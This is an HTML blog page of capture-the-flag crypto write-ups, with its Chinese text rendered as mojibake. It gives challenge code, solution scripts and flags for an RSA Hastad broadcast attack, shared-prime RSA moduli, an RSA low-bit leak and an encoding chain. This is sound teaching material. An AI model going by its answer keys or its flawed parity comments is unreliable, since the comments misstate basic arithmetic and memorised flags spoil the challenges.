<h1 id="é¹¤åŸæ¯-2021-Crazy-Rsa-Tech"><a href="#é¹¤åŸæ¯-2021-Crazy-Rsa-Tech" class="headerlink" title="[é¹¤åŸæ¯ 2021]Crazy_Rsa_Tech"></a>[é¹¤åŸæ¯ 2021]Crazy_Rsa_Tech</h1><h3 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">FLAG = bytes_to_long(pad(<span class="string">b&quot;flag&#123;??????&#125;&quot;</span>,<span class="number">64</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_key</span>():</span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">9</span></span><br><span class="line">    <span class="keyword">while</span>(GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>),e)!=<span class="number">1</span>):</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p*q</span><br><span class="line">    d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n,e,d</span><br><span class="line"> </span><br><span class="line">n_list=<span class="built_in">list</span>()</span><br><span class="line">c_list=<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    N,e,d=init_key()</span><br><span class="line">    n_list.append(N)</span><br><span class="line">    c=<span class="built_in">pow</span>(FLAG,e,N)</span><br><span class="line">    c_list.append(<span class="built_in">pow</span>(FLAG,e,N))</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(c,d,N)==FLAG)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n_list:&quot;</span>,n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c_list:&quot;</span>,c_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><blockquote>
<p>å¦‚æœé€‰å–çš„åŠ å¯†æŒ‡æ•°è¾ƒä½ï¼Œå¹¶ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†æŒ‡æ•°e åŠ å¯†å¯†æ–‡ï¼Œå¯é€šè¿‡å¹¿æ’­æ”»å‡»å¾—åˆ°æ˜æ–‡</p>
</blockquote>
<p>ä¸­å›½å‰©ä½™å®šç†</p>
<p>éšæœºç”Ÿæˆ9ç»„ n d å…¬ç”¨åŒä¸€ä¸ªe è¾“å‡ºå¯†æ–‡c æ±‚m</p>
<p>eå€¼è¾ƒä½ å¯è€ƒè™‘ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ã€å¦‚æœeå€¼è¾ƒä½ ä¸”ä½¿ç”¨åŒä¸€ä¸ªe è¿›è¡Œå¯†æ–‡åŠ å¯† å¯é€šè¿‡å¹¿æ’­æ”»å‡»å¾—åˆ°æ˜æ–‡ã€‘</p>
<p><img src="/posts/22530663/2.png"></p>
<p>æ‰€ä»¥è¿™é¢˜ å¯¹må¼€9æ¬¡æ ¹å¯å¾—åˆ° flag</p>
<h3 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n_list = [<span class="number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]</span><br><span class="line">c_list = [<span class="number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span class="number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># print(len(n_list))</span></span><br><span class="line"><span class="comment"># print(len(c_list))</span></span><br><span class="line"><span class="comment"># 9</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chinese_remainder</span>(<span class="params">n, a</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a * b, n)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> <span class="built_in">zip</span>(n, a):</span><br><span class="line">        p = prod // n_i</span><br><span class="line">        <span class="built_in">sum</span> += a_i * sympy.invert(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">sum</span> % prod)</span><br><span class="line"> </span><br><span class="line">m_e = chinese_remainder(n_list,c_list)</span><br><span class="line">e = <span class="number">9</span></span><br><span class="line"> </span><br><span class="line">m , f = gmpy2.iroot(m_e,e)  <span class="comment"># m^e å¼€eæ¬¡æ ¹</span></span><br><span class="line"><span class="comment"># print(&#x27;e = %d&#x27;%e)</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;H0w_Fun_13_HAstads_broadca5t_AtTack!&#125;\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="é¹¤åŸæ¯-2021-A-CRYPTO"><a href="#é¹¤åŸæ¯-2021-A-CRYPTO" class="headerlink" title="[é¹¤åŸæ¯ 2021]A_CRYPTO"></a>[é¹¤åŸæ¯ 2021]A_CRYPTO</h1><h3 id="é¢˜ç›®-3"><a href="#é¢˜ç›®-3" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35rot47 è§£ç å¾—åˆ°</p>
<p>c<del>dhdhdcchcâ€bad<code>d_cebacfdfdhd&#125;dbc#dac</code>dedbbbcbdfcfc#c}dfdhdddcc#c</del>d}câ€cecbc$c<del>dhcfcadbcecâ€d}ccc#câ€d`bbcddfdac</del>d}c$cachcccfbdcaddc<del>dhd}ccdbc</del>bac#chdedfced`ddbacec<del>chbcdechdec</del>cec#c#chcdcbd_c}bd</p>
<p>è¿™é‡Œrot47ä¸è¡Œ éœ€è¦ç”¨rot13è§£ç </p>
<h3 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">cipher = <span class="string">&#x27;4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35&#x27;</span></span><br><span class="line">rot13cipher = <span class="string">&#x27;4B595954494D32515046324757595A534E52415653334357474E4A575955544E4B5A4D46434F4B59474253464D5A444E4D51334557524B5A4F424944473542554B595A44534B324E49565746515532464B49345649564B464E4E494543504A35&#x27;</span></span><br><span class="line">rot47cipher = <span class="string">&#x27;c~dhdhdcchc&quot;bad`d_cebacfdfdhd&#125;dbc#dac`dedbbbcbdfcfc#c&#125;dfdhdddcc#c~d&#125;c&quot;cecbc$c~dhcfcadbcec&quot;d&#125;ccc#c&quot;d`bbcddfdac~d&#125;c$cachcccfbdcaddc~dhd&#125;ccdbc~bac#chdedfced`ddbacec~chbcdechdec~cec#c#chcdcbd_c&#125;bd&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(base64.b16decode(rot13cipher))</span><br><span class="line"><span class="comment"># KYYTIM2QPF2GWYZSNRAVS3CWGNJWYUTNKZMFCOKYGBSFMZDNMQ3EWRKZOBIDG5BUKYZDSK2NIVWFQU2FKI4VIVKFNNIECPJ5</span></span><br><span class="line"><span class="built_in">print</span>(base64.b32decode(base64.b16decode(rot13cipher)))</span><br><span class="line"><span class="comment"># b&#x27;V143Pytkc2lAYlV3SlRmVXQ9X0dVdmd6KEYpP3t4V29+MElXSER9TUEkPA==&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(base64.b32decode(base64.b16decode(rot13cipher))))</span><br><span class="line"><span class="comment"># b&#x27;W^7?+dsi@bUwJTfUt=_GUvgz(F)?&#123;xWo~0IWHD&#125;MA$&lt;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b85decode(base64.b64decode(base64.b32decode(base64.b16decode(rot13cipher)))))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;W0w_y0u_c4n_rea11y_enc0d1ng!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="é¹¤åŸæ¯-2021-easy-crypto"><a href="#é¹¤åŸæ¯-2021-easy-crypto" class="headerlink" title="[é¹¤åŸæ¯ 2021]easy_crypto"></a>[é¹¤åŸæ¯ 2021]easy_crypto</h1><h3 id="é¢˜ç›®-4"><a href="#é¢˜ç›®-4" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>å…¬æ­£å…¬æ­£å…¬æ­£è¯šä¿¡æ–‡æ˜å…¬æ­£æ°‘ä¸»å…¬æ­£æ³•æ²»æ³•æ²»è¯šä¿¡æ°‘ä¸»è‡ªç”±æ•¬ä¸šå…¬æ­£å‹å–„å…¬æ­£å¹³ç­‰å¹³ç­‰æ³•æ²»æ°‘ä¸»å¹³ç­‰å¹³ç­‰å’Œè°æ•¬ä¸šè‡ªç”±è¯šä¿¡å¹³ç­‰å’Œè°å¹³ç­‰å…¬æ­£æ³•æ²»æ³•æ²»å¹³ç­‰å¹³ç­‰çˆ±å›½å’Œè°å…¬æ­£å¹³ç­‰æ•¬ä¸šå…¬æ­£æ•¬ä¸šè‡ªç”±æ•¬ä¸šå¹³ç­‰è‡ªç”±æ³•æ²»å’Œè°å¹³ç­‰æ–‡æ˜è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰å¯Œå¼ºå…¬æ­£æ•¬ä¸šå¹³ç­‰æ°‘ä¸»å…¬æ­£è¯šä¿¡å’Œè°å…¬æ­£æ–‡æ˜å…¬æ­£çˆ±å›½è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰æ–‡æ˜å…¬æ­£è¯šä¿¡å¯Œå¼ºè‡ªç”±æ³•æ²»æ³•æ²»å¹³ç­‰å¹³ç­‰è‡ªç”±å¹³ç­‰å¯Œå¼ºæ³•æ²»è¯šä¿¡å’Œè°</p>
<h3 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h3><p><a href="https://atool.vip/corevalue/">https://atool.vip/corevalue/</a> ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç  ç›´æ¥æ¥è§¦flag</p>
<p>flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</p>
<h1 id="ç¾ŠåŸæ¯-2022-EasyRsa-ã€å…±äº«ç´ æ•°ã€‘"><a href="#ç¾ŠåŸæ¯-2022-EasyRsa-ã€å…±äº«ç´ æ•°ã€‘" class="headerlink" title="[ç¾ŠåŸæ¯ 2022]EasyRsa ã€å…±äº«ç´ æ•°ã€‘"></a>[ç¾ŠåŸæ¯ 2022]EasyRsa ã€å…±äº«ç´ æ•°ã€‘</h1><h3 id="é¢˜ç›®-5"><a href="#é¢˜ç›®-5" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"> </span><br><span class="line"><span class="comment"># c1  m1=c1</span></span><br><span class="line"><span class="comment"># c2 = pow(c1,e,n)</span></span><br><span class="line"><span class="comment"># ci = pow(ci-1,e,n)</span></span><br><span class="line"><span class="comment"># æ¯æ¬¡å–æ–‡æœ¬ä¸­çš„æ•°ä½œä¸º åŠ å¯†çš„æ¨¡æ•°</span></span><br><span class="line"><span class="comment"># æ¯æ¬¡å¾—åˆ°çš„å¯†æ–‡ä¼šä½œä¸ºä¸‹ä¸€æ¬¡çš„æ˜æ–‡è¿›è¡ŒåŠ å¯†</span></span><br><span class="line"><span class="comment"># ä¹Ÿå°±å¯ä»¥ç†è§£ä¸º è¿ç»­åŠ å¯†äº†len(a)é æ¯æ¬¡éƒ½ç”¨ä¸åŒçš„æ¨¡æ•°</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># å·²çŸ¥æœ€åä¸€æ¬¡åŠ å¯†çš„å¯†æ–‡ c  æœ€åä¸€æ¬¡åŠ å¯†çš„æ¨¡æ•°n  æŒ‡æ•°e</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨å¤šç»„æ¨¡æ•° å¯ä»¥æœ‰é™è€ƒè™‘ æ¨¡æ•°å…±ç”¨ç´ å› å­</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span></span><br><span class="line"><span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span></span><br><span class="line"><span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span></span><br><span class="line"><span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span></span><br><span class="line"><span class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span></span><br><span class="line"><span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span></span><br><span class="line"><span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span></span><br><span class="line"><span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span></span><br><span class="line"><span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span></span><br><span class="line"><span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span></span><br><span class="line"><span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span></span><br><span class="line"><span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span></span><br></pre></td></tr></table></figure>



<h3 id="WP-5"><a href="#WP-5" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    n_list = fp.read().splitlines()</span><br><span class="line"><span class="built_in">print</span>(n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">int</span>(n_list[<span class="number">0</span>])))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(n_list))</span><br><span class="line"> </span><br><span class="line">p = gmpy2.gcd(<span class="built_in">int</span>(n_list[<span class="number">0</span>]),<span class="built_in">int</span>(n_list[<span class="number">1</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n_list)-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(<span class="built_in">int</span>(n_list[<span class="number">0</span>]),<span class="built_in">int</span>(n_list[<span class="number">1</span>])) == p</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] å­˜åœ¨å…¬å› æ•°&quot;</span>,p)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> n_list[::-<span class="number">1</span>]:</span><br><span class="line">    q = <span class="built_in">int</span>(n) // p</span><br><span class="line">    d = gmpy2.invert(e,(q-<span class="number">1</span>)*(p-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,<span class="built_in">int</span>(n))</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="zer0pts-2020-ROR"><a href="#zer0pts-2020-ROR" class="headerlink" title="[zer0pts 2020]ROR"></a>[zer0pts 2020]ROR</h2><h3 id="é¢˜ç›®-6"><a href="#é¢˜ç›®-6" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">ror = <span class="keyword">lambda</span> x, l, b: (x &gt;&gt; l) | ((x &amp; ((<span class="number">1</span>&lt;&lt;l)-<span class="number">1</span>)) &lt;&lt; (b-l))</span><br><span class="line"><span class="comment"># å¾ªç¯å³ç§»   2|n  -&gt; cçš„æœ€ä½ä½å°±æ˜¯mçš„æœ€ä½ä½</span></span><br><span class="line"><span class="comment"># éå†æ‰€æœ‰çš„ cçš„æœ€ä½ä½ åˆå¹¶å³å¯å¾—åˆ°m</span></span><br><span class="line"> </span><br><span class="line">N = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> base <span class="keyword">in</span> [<span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>]:</span><br><span class="line">    N *= <span class="built_in">pow</span>(base, random.randint(<span class="number">123</span>, <span class="number">456</span>))</span><br><span class="line">    <span class="comment">#  N = 2^x * 3^y * 7^z</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># å¥‡ * å¥‡ = å¥‡</span></span><br><span class="line">    <span class="comment"># å¶ * å¶ = å¶</span></span><br><span class="line">    <span class="comment"># å¥‡ * å¶ = å¥‡</span></span><br><span class="line">    <span class="comment"># æ‰€ä»¥ Næœ€ç»ˆä¸º2çš„å€æ•° ä¸ºå¶æ•° å¯¹åº”çš„æœ€åä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸º 1</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># å½“A &gt; Bæ—¶ï¼š</span></span><br><span class="line">    <span class="comment"># è‹¥Bä¸ºå¶æ•°ï¼ŒA % Bçš„å¥‡å¶æ€§åŒAçš„å¥‡å¶æ€§ä¸€è‡´</span></span><br><span class="line">    <span class="comment"># è‹¥Bä¸ºå¥‡æ•°ï¼ŒA % Bçš„å¥‡å¶æ€§åŒAçš„å¥‡å¶æ€§ç›¸å</span></span><br><span class="line">    <span class="comment"># å½“A &lt; Bæ—¶ï¼š</span></span><br><span class="line">    <span class="comment"># A % Bçš„å¥‡å¶æ€§ä¸Aä¸€è‡´</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># N &gt; m   Nä¸ºå¶æ•° æ‰€ä»¥m ä¹Ÿå°±æ˜¯å¶æ•°</span></span><br><span class="line">    <span class="comment"># å¯¹åº” pow(c,d,n) ä¹Ÿä¸ºå¶æ•°</span></span><br><span class="line">    <span class="comment"># æ‰€ä»¥æ¯æ¬¡å¾—åˆ°çš„ç»“æœä¸­ æœ€åä¸€ä¸ª 1bitä½ å’Œ mçš„æœ€åä¸€ä¸ªbitä½ä¸€æ ·</span></span><br><span class="line">    <span class="comment"># æ‰€ä»¥æ±‚æ¯ä¸ªCçš„æœ€åä¸€ä¸ªäºŒè¿›åˆ¶ä½ ç»„åˆèµ·æ¥å°±æ˜¯ m</span></span><br><span class="line">     </span><br><span class="line">e = random.randint(<span class="number">271828</span>, <span class="number">314159</span>)</span><br><span class="line"> </span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; N.bit_length()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m.bit_length()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(ror(m, i, m.bit_length()), e, N))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># C =  ( ror(m,i,m.len)  ) ^e mod n</span></span><br></pre></td></tr></table></figure>

<h3 id="WP-6"><a href="#WP-6" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;chall.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    li.append(<span class="built_in">int</span>(i.strip(<span class="string">&#x27;\n&#x27;</span>)))</span><br><span class="line"><span class="comment"># print(li)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">    flag+=<span class="built_in">bin</span>(i)[-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+flag[::-<span class="number">1</span>])))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#zer0pts&#123;0h_1t_l34ks_th3_l34st_s1gn1f1c4nt_b1t&#125;</span></span><br></pre></td></tr></table></figure>



